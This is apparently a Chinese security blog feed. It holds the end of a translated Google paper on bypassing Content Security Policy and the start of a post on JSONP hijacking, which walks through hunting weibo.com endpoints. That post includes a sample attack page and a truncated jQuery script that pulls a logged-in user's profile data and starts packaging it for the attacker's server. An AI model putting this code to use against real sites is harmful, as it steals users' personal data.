端点</strong></h5><p>为了识别JSONP端点，我们从搜索索引中提取了包含GET参数的所有URL，其中包含以下名称之一：callback，cb，json，jsonp。</p><p>随后，我们通过更改相应参数的值，请求资源并且检查更改的值是否能在返回值的开头反射出来，从而验证结果数据集</p><p>我们通过验证响应中允许的字符来检查所有端点是否允许完整的XSS或SOME攻击。根据我们的数据，39％的JSONP绕过允许任意JS执行，而其余的允许通过SOME攻击任意调用现有函数，在实际应用程序中被认为与完整XSS一样有害。</p><h5 id="AngularJS："><a href="#AngularJS：" class="headerlink" title="AngularJS："></a><strong>AngularJS：</strong></h5><p>对于AngularJS库，我们创建了一个小签名，该签名与源代码的特定部分（迷你版和非迷你版）相匹配。对于每个匹配，我们然后通过匹配包含的版本字符串来提取文件的版本。</p><h3 id="结果与分析"><a href="#结果与分析" class="headerlink" title="结果与分析"></a><strong>结果与分析</strong></h3><h4 id="网络上的CSP状态"><a href="#网络上的CSP状态" class="headerlink" title="网络上的CSP状态"></a><strong>网络上的CSP状态</strong></h4><p>我们使用Google的一个索引作为检测CSP策略的数据集。在此分析时，此特定索引包含大约1060亿个唯一URL，跨越10亿个主机名和1.75亿个顶级私有域.3我们认为此索引代表了当前的Web状态，因为所有URL都是由在我们分析前约20天的时间范围内使用Google抓取工具。</p><p>在此数据集中，我们发现3,913,578,446（3.7％）个网址带有CSP政策。但是，这个数字并不是CSP采用率的良好近似值，因为具有大量URL的应用程序可能在整个数据集中过多。在考虑跨域分布时，总体情况看起来不同：274,214个顶级私有域中仅有1,664,019（0.16％）的所有主机名都部署了CSP策略。在此列表中，仅使用少数不同的策略将100万个主机名映射到ve-commerce4应用程序之一。为了解决这个问题，我们使用规范化策略对数据集进行了重复数据删除。通过这样做，我们确定了26,011个独特的政策。</p><h4 id="CSP-如何被使用"><a href="#CSP-如何被使用" class="headerlink" title="CSP 如何被使用"></a><strong>CSP 如何被使用</strong></h4><p>它有许多其他用例。因此，作为第一步，我们试图确定CSP是否用于其预期目的。图1显示了所有CSP指令的列表，按发生次数排序。该列表清楚地显示了script-src and/or default-src 指令在大多数策略中使用。相比之下，frame-ancestors指令，可用于控制框架行为页面的使用仅在8.1％的策略中使用。此外，在26,011个唯一策略中，只有9.96％处于仅报告模式，而其他90.04％处于强制模式。在这些数字中，我们看到明确的证据表明CSP意味着XSS保护。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A59.png" alt="此处输入图片的描述"></p><h4 id="CSP的一般安全性"><a href="#CSP的一般安全性" class="headerlink" title="CSP的一般安全性"></a><strong>CSP的一般安全性</strong></h4><p>为了评估检测到的CSP策略的安全属性，我们自动应用了之前的检查。基于对配置和白名单可绕行性的分析，我们观察到整个数据集中94.72％的策略不受XSS的任何保护。</p><p>重要的是要注意，其中一些策略不处于强制模式或不用于防止XSS;然而，即使对于XSS保护政策，可绕过政策的百分比也非常相似：94.68％。</p><p>不幸的是，<strong>大多数策略本质上都是不安全的</strong>。在XSS保护策略中，87.63％使用’unsafe-inline’关键字而未指定nonce，<strong>这实际上禁用了CSP的保护功能。</strong></p><p>这个高的令人惊讶的数字可能是因为<strong>许多Web应用程序需要重写其大部分代码才能与CSP兼容</strong>。<strong>其中一些页面可能仍处于过渡阶段，需要使用“unsafe-inline”关键字</strong>。虽然从长远来看这个问题可能会被解决，但许多策略都包含其他明显的问题。例如，我们确定<strong>9.4％的策略既不包含default-src，也不包含object-src指</strong>令。因此，攻击者可以通过<strong>注入能够执行JavaScript的恶意Flash对象来利用XSS漏洞</strong>。此外，21.48％的策略在script-src或default-src指令中使用通用通配符或URI方案（http：或https:)，因此允许包含来自任意，可能受攻击者控制的主机的脚本。</p><p>鉴于这些值，似乎绝大多数策略都无法有效地防范XSS攻击。但是，由于CSP可能不成熟，因此早期采用问题可能会导致数字偏大。为了解释这一事实，我们编制了一套策略不包含微不足道的问题，例如’unsafe-inline’关键字或白名单中的通用通配符。总计，我们找到了符合这些条件的2,437条策略。我们观察到，通过我们的自动策略分析工具，我们仍然能够绕过这些严格策略的51.05％。</p><p>虽然这些旁路中的一些是由缺少 object-src 和 default-src 指令引起的，但大多数旁路是由script-src白名单中的不安全起源引起的。在下一节中，我们将详细讨论我们对白名单的分析。</p><h4 id="白名单安全性"><a href="#白名单安全性" class="headerlink" title="白名单安全性"></a><strong>白名单安全性</strong></h4><p><strong>对于白名单中的每个主机，维护者需要确保攻击者无法注入恶意内容</strong>，这些内容可以通过<code>&lt;script&gt;</code>或<code>&lt;object&gt;</code>标记包含在内。如前所述，JSONP端点和AngularJS库是实现此目的的众多方法中的两种。如果即使只有一个域暴露这样的端点，CSP的反XSS功能也会变得无用。因此，<strong>白名单越大，维护相应政策的安全性就越困难。</strong></p><p>作为我们分析的结果，<strong>我们得出结论，在传统的基于白名单的模型中部署CSP以防止XSS是不可行的，因为在实践中通常会破坏脚本执行限制。我们建议在第4节中通过制定CSP策略来解决此问题的方法，该策略用脚本nonces替换域白名单</strong></p><h2 id="CSP-提升"><a href="#CSP-提升" class="headerlink" title="CSP 提升"></a><strong>CSP 提升</strong></h2><p>实际上，目前使用CSP的绝大多数网站都部署了一项不对XSS提供安全保护的策略。 除了明显的配置问题（具有’unsafe-inline’的策略和未指定object-src的策略），策略不安全的主要原因是script-src白名单的可绕行性。 </p><p>在现代网络上，基于白名单域的方法（即使伴随路径）似乎过于灵活，无法很好的让开发人员阻止XSS。</p><p>与此同时<strong>，CSP已经提供了更细粒度的授予脚本信任的方法：加密 nonces和hashes</strong>。特别是，nonces允许开发人员显式地注释每个可信脚本（内联和外部），同时禁止执行攻击者注入的脚本。</p><p>为了提高CSP的整体安全性，我们提出了一种略微不同的编写策略的方法。应用程序维护人员应该应用基于nonces的保护方法，<strong>而不是依赖于白名单</strong>。以下清单描述了基于白名单的CSP策略和满足此策略的脚本：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A510.png" alt="此处输入图片的描述"></p><p>不幸的是，此策略的白名单<strong>包含一个不安全的主机，因此描述的策略是不安全</strong>的。攻击者可以通过注入具有以下URL的脚本来滥用JSONP端点：<a href="https://example.org/script.js?callback=" target="_blank" rel="noopener">https://example.org/script.js?callback=</a> malicious_code。</p><p>为避免此问题，我们建议以下列方式重写此类策略：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A511.png" alt="此处输入图片的描述"></p><p>通过使用 nonce ，脚本可以单独列入白名单。<br><strong>即使攻击者能够找到XSS，nonce值也是不可预测的，因此攻击者无法注入指向JSONP端点的有效脚本。</strong></p><p>CSP的一个有用功能是它允许集中执行安全决策。例如，安全团队可能会使用CSP来强制执行一组允许加载脚本的可信主机，而不是依赖开发人员的善意而不包括来自不受信任站点的脚本。然而，在单一的基于随机数的策略中，这是不可能的;资源只需要遵循白名单或随机数。因此，将白名单添加到基于随机数的策略会消除的优点。<strong>有趣的是，浏览器允许执行多个策略。如果为页面指定了两个策略，则浏览器会确保资源遵循这两个策略。（这一点在 2018 TCTF 的一道题中就涉及到了，两个同名的策略都有效）</strong>因此，此功能可用于获得两个方面的好处：<strong>一个基于nonces的策略可用于将单个脚本列入白名单</strong>，而另一个<strong>基于白名单的策略可用于集中执行安全决策</strong>。通过用逗号分隔两个策略，可以在同一个HTTP响应头中将这两个策略传送到客户端：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A512.png" alt="此处输入图片的描述"></p><p>然而，<strong>当通过JavaScript将新脚本添加到页面时</strong>，会出现基于随机数的策略的另一个问题：因为JS库可能不知道CSP并且不知道正确的CSP 随机数，<strong>所以CSP将阻止动态插入的脚本执行，部分应用程序将失败。</strong></p><p>在不依赖源列表的情况下，我们为script-src提出了一个新的源表达式：’strict-dynamic’。 ‘strict-dynamic’是CSP3规范草案5，在Chrome和Opera中实现。我们在后面会描述了一个流行的生产应用程序中的采用过程和结果。</p><h3 id="将信任传播到动态脚本"><a href="#将信任传播到动态脚本" class="headerlink" title="将信任传播到动态脚本"></a><strong>将信任传播到动态脚本</strong></h3><p>在script-src源列表中添加建议的’strict-dynamic’关键字会产生以下后果：</p><ul><li><strong>允许动态添加的脚本执行</strong>。实际上，这意味着策略将允许document.createElement(‘script’)创建的脚本节点，无论它们加载的URL是否在script-src白名单中。</li><li><strong>其他script-src白名单条目将被忽略</strong>。除非伴随有效的nonce，否则浏览器不会执行静态或解析器插入的脚本</li></ul><p>这种方法背后的核心点是，<strong>通过调用createElement()添加的脚本已经被应用程序信任(开发人员明确选择加载和执行它们)</strong>。另一方面，发现标记注入bug的攻击者<strong>无法在不首先执行JavaScript的情况下直接调用createElement();</strong>并且攻击者无法在不知道策略中定义的适当nonce的情况下注入恶意脚本并执行JavaScript。</p><p>这种使用CSP的方式有望实现基于nonce的策略，其中执行脚本的能力由开发人员通过在可信脚本上设置nonce来控制，并允许信任通过设置’strict-dynamic’传播到下标。</p><p>例如，开发人员可以设置类似于以下内容的策略：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A513.png" alt="此处输入图片的描述"></p><p>使用这样的策略，所有者需要向静态<code>&lt;script&gt;</code>元素添加nonce，但是可以确保只有这些可信脚本及其后代才会执行。</p><p>这种部署CSP的模式可以显着提高策略的安全性并促进采用。</p><h3 id="strict-dynamic-案例研究"><a href="#strict-dynamic-案例研究" class="headerlink" title="strict-dynamic 案例研究"></a><strong>strict-dynamic 案例研究</strong></h3><p>2015年2月，我们在Google地图活动中采用了基于白名单的强制执行内容安全政策，这是一个由400万月活跃用户使用的复杂且重量级的JavaScript网络应用程序。我们从一个简单的策略开始，包括一个nonce和整个origin，但必须逐步扩展它(在整个2015年进行5次重大更改)以应对应用程序，API和库中的更改，同时保持白名单路径的安全性和限制性可能。为了避免生产中断，我们不得不定期更新origin<br>来对API和内容服务基础架构的更改。这导致了script-src白名单的大小爆炸：它增长到15条长路径，遗憾的是仍然必须包含至少一个JSONP端点，从而在XSS保护方面损害了策略的有效性。</p><p>由于标记中的脚本已经到位，因此从基于白名单的方法切换到具有“strict-dynamic”的非常规策略不需要重构。该交换机还允许我们大幅简化策略，避免破坏，同时使其更安全，更易于维护(事实上，从那时起我们就不必对策略进行更改)。</p><p>到目前为止，我们已经在Google照片，云控制台，历史记录，文化学院和其他机构中部署了一个仅限于nonce-only的政策，其中包含“strict-dynamic”和非常少的电子邮件。</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a><strong>限制</strong></h3><p><strong>使用“strict-dynamic”的基于随机数的策略可以提供更安全，更易于部署的CSP，但它们并不是XSS的灵丹妙药。作者仍需要注意安全性和兼容性方面的考虑因素：</strong></p><h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a><strong>安全性</strong></h4><ul><li><p>注入动态创建的脚本的src属性：使用’strict-dynamic’，如果XSS错误的根本原因是将不受信任的数据注入到传递给通过createElement()创建的脚本的src属性的URL中API，该bug将变得可利用，而使用基于白名单的策略，脚本的位置将仅限于策略中允许的源。</p></li><li><p>注入<code>nonced &lt;script&gt;</code>：如果注入点位于开发人员信任的  <code>&lt;script&gt;</code>内，则攻击者将能够无限制地执行其恶意脚本。但是，传统政策仍然可以实现这一点。</p></li><li><p>post-XSS/scriptless 攻击：即使策略阻止攻击者在应用程序的上下文中执行任意脚本，其他有限但也具有破坏性的攻击仍可能。</p></li></ul><h4 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a><strong>兼容性</strong></h4><ul><li><p>解析器插入的脚本：如果应用程序使用诸如document.write()之类的API来动态添加脚本，即使它们指向列入白名单的资源，它们也会被“strict-dynamic”阻止。采用者必须重构此类代码以使用其他API（如createElement()），或者将nonce显式传递给使用document.write()创建的<code>&lt;script&gt;</code>元素。</p></li><li><p>内联事件处理程序：’strict-dynamic’不会消除删除与CSP不兼容的标记的耗时过程，例如javascript：URI或内联事件处理程序。在采用CSP之前，开发人员仍需要重构这些模式。</p></li></ul><p>尽管存在这些警告，但基于对Google内部数据集中数百个XSS错误的分析，我们预计大部分XSS将使用基于随机数的策略进行缓解，并且采用此类策略对于开发人员而言要比基于白名单的传统方法。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a><strong>相关工作</strong></h2><p>2007年发表了第一篇提出将脚本列入白名单以阻止注入攻击的论文之一。名为Browser-Enforced Embedded Policies（BEEP）的系统旨在根据应用程序所有者提供的策略限制浏览器级别的脚本包含。与BEEP相似，Oda等。提出了SOMA，它将BEEP的思想从脚本扩展到其他Web资源。Stamm等人提出了这些想法。谁发布了最初的CSP论文，称为“Reining in the Web with Content Security Policy”。之后，CSP被几家浏览器厂商和标准化委员会选中。2011年，Firefox 以及Chromium 发布第一个实验原型。随后，CSP的几个迭代已经标准化并发布。</p><p>最初，CSP受到了很多关注，许多网站开始尝试使用它。但是，由于CSP需要大规模更改，因此采用率仍然很小。 2014年，Weissbacher等人。发表了关于采用CSP的第一项研究。在他们的研究中，他们发现前100个网页中只有1％使用了CSP。为了探究这种低采用率背后的原因，他们通过将CSP策略部署到三个不同的站点进行了实验</p><p>因此，他们发现创建初始策略非常困难，因为安全策略需要对现有应用程序进行大量更改。Doup等人研究了这个问题。他们的系统名为deDacota，采用自动代码重写来外化内联脚本。这反过来又使他们的系统能够自动将CSP策略部署到给定的应用程序。</p><p>Kerschbaumer等旨在解决类似的问题。他们观察到许多页面使用了不安全的“unsafe-inline”关键字，以避免重写其应用程序。因此，Kerschbaumer等。创建了一个系统，通过众包学习方法自动生成CSP策略。随着时间的推移，他们的系统学习了多个用户观察到的合法脚本，并确保只有这些合法脚本通过脚本哈希在策略中列入白名单。</p><p>约翰斯研究了CSP中的另一个问题。在他的论文中，他解决了由动态生成的脚本引起的安全问题。为了应对类似JSONP的端点所施加的威胁，他建议不要根据脚本的来源将脚本列入白名单，而是根据校验和将脚本列入白名单;即脚本的哈希值。但是，这种方法仅适用于静态文件，而不适用于JSONP等动态文件。因此，他提出了一种脚本模板机制，允许开发人员将动态数据值与静态代码分开。通过这种方式，可以为其静态部分计算脚本的哈希值，同时它仍然能够包含动态数据值。</p><p>Hausknecht等人的另一篇论文。调查浏览器扩展和CSP之间的紧张关系。作者对Chrome网上商店的浏览器扩展进行了大规模研究，发现许多扩展程序都篡改了网页的CSP。因此，他们提出了一种认可机制，允许扩展程序在更改安全策略之前请求网页获得许可。</p><p>在第4节中，我们提出了一种编写CSP策略的新方法。我们建议使用脚本nonce而不是白名单。之前已经提出使用随机数来防止XSS的想法。第一篇论文提出了一个名为Noncespaces的系统。 </p><p>Noncepaces会自动为合法的HTML标记添加随机XML命名空间。如果应用程序中发生注入漏洞，则攻击者无法预测此随机命名空间，因此无法注入有效的脚本标记。</p><p>另一个掌握指令集随机化思想的系统是xJs。xJS使用在服务器和浏览器之间共享的密钥对所有合法的JavaScript代码进行异或，并为每个请求刷新。由于浏览器在运行时解密脚本并且攻击者无法知道密钥，因此无法创建有效的漏洞利用负载。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>在本文中，我们基于大规模的实证研究，对在实际应用中采用CSP的实际安全性评估进行了评估。</p><p>我们对CSP的安全模型进行了深入分析，并确定了几个看似安全的策略没有提供安全性改进的情况。我们调查了超过10亿个主机名采用CSP，并使用Google搜索索引中的26,011个独特政策识别了160万个主机。</p><p>不幸的是，这些政策中的大多数本质上都是不安全的。通过自动检查，我们能够证明94.72％的所有策略都可以被具有标记注入错误的攻击者轻易绕过。此外，我们分析了白名单的安全属性。因此，我们发现75.81％的所有政策和41.65％的所有严格政策在其白名单中至少包含一个不安全的主机。这些数字使我们相信白名单在CSP政策中使用是不切实际的。</p><p>因此，我们提出了一种新的政策写作方式。我们建议通过基于CSP nonce的方法启用单个脚本，而不是将整个主机列入白名单。</p><p>为了简化基于随机数的CSP的采用，我们还提出了“严格动态”关键字。一旦在CSP策略中指定，此关键字使浏览器内的模式能够将nonce继承到动态脚本。</p><p>因此，如果使用nonce信任的脚本在运行时创建新脚本，则此新脚本也将被视为合法。</p><p>虽然这种技术背离了CSP的传统主机白名单方法，但我们认为可用性的改进足明其广泛采用的合理性。</p><p>由于这是一种选择加入机制，因此默认情况下不会降低CSP的保护功能。</p><p>我们希望基于随机数的方法和“严格动态”关键字的结合将使开发人员和组织能够真正享受内容安全策略带来的真正安全性。</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h2><p><a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;&lt;strong&gt;摘要&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;内容安全策略是一种Web平台机制，旨在&lt;strong&gt;缓解&lt;/strong&gt;现代Web应用程序中的顶级安全漏洞跨站点脚本（XSS)。在本文中，我们仔细研究了采用CSP的实际好处，并在实际部署中识别出重要的aws，导致所有不同策略的94.72％被绕过。&lt;/p&gt;
&lt;p&gt;我们的互联网范围内的分析基于来自超过10亿个主机名的大约1000亿页的搜索引擎语料库;结果涵盖了1,680,867个主机上的CSP部署，以及26,011个独特的CSP策略(迄今为止最全面的研究)。我们介绍了CSP规范的安全相关方面，并对其威胁模型进行了深入分析，重点关注XSS保护。&lt;/p&gt;
&lt;p&gt;我们确定了&lt;strong&gt;三种常见的CSP绕过类并解释了它们如何破坏策略的安全性。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;然后，我们转向对因特网上部署的策略进行定量分析，以了解其安全性。我们观察到15个域中最常用于加载脚本的白名单中有14个包含不安全的端点;因此，&lt;strong&gt;75.81％的不同策略使用允许攻击者绕过CSP的脚本白名单&lt;/strong&gt;。总的来说，我们发现&lt;strong&gt;94.68％的试图限制脚本执行的策略是无效的，99.34％的CSP主机使用的策略对预防XSS没有好处&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最后，&lt;strong&gt;我们提出了 “strict-dynamic” 关键字&lt;/strong&gt;，这是对规范的补充，&lt;strong&gt;有助于创建基于加密nonces的策略&lt;/strong&gt;，而不依赖于域白名单。我们讨论了&lt;strong&gt;在复杂应用程序中部署这种基于随机数的策略的经验&lt;/strong&gt;，并为Web开发者提供了改进其策略的指导。&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;&lt;strong&gt;介绍&lt;/strong&gt;&lt;/h2&gt;
    
    </summary>
    
      <category term="翻译" scheme="https://www.k0rz3n.com/categories/%E7%BF%BB%E8%AF%91/"/>
    
    
      <category term="CSP" scheme="https://www.k0rz3n.com/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>JSONP 劫持原理与挖掘方法</title>
    <link href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/"/>
    <id>https://www.k0rz3n.com/2019/03/07/JSONP 劫持原理与挖掘方法/</id>
    <published>2019-03-07T00:14:18.000Z</published>
    <updated>2019-04-28T13:59:40.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>最近打算看一些前端方面的东西，琢磨着从哪里开始看起，正好想到之前我还有一篇 <a href="https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/">由浅入深理解 jsonp 并拓展</a> 这样的文章，主要介绍的是 jsonp 的概念，利用思路还没有讲，于是干脆就接着写这个话题吧。</p><h2 id="0X01-什么是-JSONP-劫持"><a href="#0X01-什么是-JSONP-劫持" class="headerlink" title="0X01 什么是 JSONP 劫持"></a><strong>0X01 什么是 JSONP 劫持</strong></h2><p>由于之前的那篇文章已经详细介绍过 jsonp 的工作原理，所以这里就不再详细介绍原理了，就简单的说一下：</p><p><strong>JSONP</strong> 就是为了跨域<strong>获取资源</strong>而产生的一种<strong>非官方</strong>的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性，</p><a id="more"></a><p>那么<strong>劫持</strong>又是怎么回事呢？其实我们在学安全的过程中对劫持这个词可以说是一点也不陌生，我们遇到过很多的劫持的攻击方法，比如：dns 劫持、点击劫持、cookie劫持等等，也正如劫持这个词的含义：“拦截挟持”，dns 劫持就是把 dns 的解析截获然后篡改，点击劫持就是截获你的鼠标的点击动作，在用户不知情的情况下点击攻击者指定的东西，cookie 劫持就是获取用户的 cookie，然后可以进一步伪造身份，那么同样， jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据</p><h2 id="0X02-JSONP-漏洞的利用过程及危害"><a href="#0X02-JSONP-漏洞的利用过程及危害" class="headerlink" title="0X02 JSONP 漏洞的利用过程及危害"></a><strong>0X02 JSONP 漏洞的利用过程及危害</strong></h2><p>通过JSONP技术可以实现数据的跨域访问，必然会产生安全问题，如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞能够获取用户在网站B上的数据。</p><h3 id="1-JSONP漏洞利用过程如下："><a href="#1-JSONP漏洞利用过程如下：" class="headerlink" title="1.JSONP漏洞利用过程如下："></a><strong>1.JSONP漏洞利用过程如下：</strong></h3><p>1）用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；<br>2）用户通过浏览器向网站A发出URL请求；<br>3）网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下：</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;function Callback(result){    alert(result.name);}&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt;</code></pre><p>4）用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求；<br>5）网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</p><pre><code>Callback({&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;})。</code></pre><p>6）网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</p><h3 id="2-JSONP-漏洞利用过程示意图"><a href="#2-JSONP-漏洞利用过程示意图" class="headerlink" title="2.JSONP 漏洞利用过程示意图"></a><strong>2.JSONP 漏洞利用过程示意图</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%951.png" alt="此处输入图片的描述"></p><h3 id="3-JSONP-劫持漏洞的危害"><a href="#3-JSONP-劫持漏洞的危害" class="headerlink" title="3.JSONP 劫持漏洞的危害"></a><strong>3.JSONP 劫持漏洞的危害</strong></h3><p><strong>JSONP是一种敏感信息泄露的漏洞</strong>，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，<strong>网站中包含其他网站的JSONP漏洞利用代码</strong>，将链接通过邮件等形式推送给受害人，<strong>如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，</strong>这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p><h2 id="J0X03-SOP-漏洞的挖掘思路"><a href="#J0X03-SOP-漏洞的挖掘思路" class="headerlink" title="J0X03 SOP 漏洞的挖掘思路"></a><strong>J0X03 SOP 漏洞的挖掘思路</strong></h2><p>这里我采用chrome浏览器的调试窗口进行挖掘weibo.com中存在的漏洞(测试之前需要登录一下，因为我们需要检测是不是会有敏感信息泄露)</p><p>首先把Preserve log选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%952.png" alt="此处输入图片的描述"></p><p>然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 callback json jsonp email</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%953.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%954.png" alt="此处输入图片的描述"></p><p>然后我们需要人工确认这个请求的返回值是否有泄露用户的敏感信息，并且能被不同的域的页面去请求获取，这里以上面查找到的 jsonp 为例</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%955.png" alt="此处输入图片的描述"></p><p>发现并不是什么很有价值的信息，再来看看能不能被不同的域的页面请求到(也就是测试一下服务器端有没有对其验证请求来源）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%956.png" alt="此处输入图片的描述"></p><p>发现换成了别的浏览器还是能检测到，说明验证的来源有些问题</p><blockquote><p><strong>注意：</strong></p><p>上面的测试只是我为了简单的演示整个流程，所以在测试前我并没有登录，因此，上面的测试并不能说明漏洞存在</p></blockquote><p><strong>当然，这种人工的低效的检测方式我们完全可以将其变成主动或者被动的扫描器实现，那样效率会高得多</strong></p><p>自动化测试工具Selenium + Proxy + 验证脚本</p><p>(1)Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；<br>(2)Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求；<br>(3)验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！</p><h2 id="0X04-JSONP-漏洞利用技巧"><a href="#0X04-JSONP-漏洞利用技巧" class="headerlink" title="0X04 JSONP 漏洞利用技巧"></a><strong>0X04 JSONP 漏洞利用技巧</strong></h2><h3 id="1-利用技巧"><a href="#1-利用技巧" class="headerlink" title="1.利用技巧"></a><strong>1.利用技巧</strong></h3><p>JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作(<a href="https://www.freebuf.com/articles/web/70025.html" target="_blank" rel="noopener">水坑攻击</a>)，下面的一个例子就可以说是在模拟水坑攻击</p><p>当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上</p><pre><code>$.ajax({    url: &apos;https://api.weibo.com/2/{隐藏了哦}&apos;,    type: &apos;get&apos;,    dataType: &apos;jsonp&apos;,}).done(function(json){    var id = json[&quot;data&quot;][&quot;id&quot;];    var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;];    var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;];    var post_data = &quot;&quot;;    post_data += &quot;id=&quot; + id + 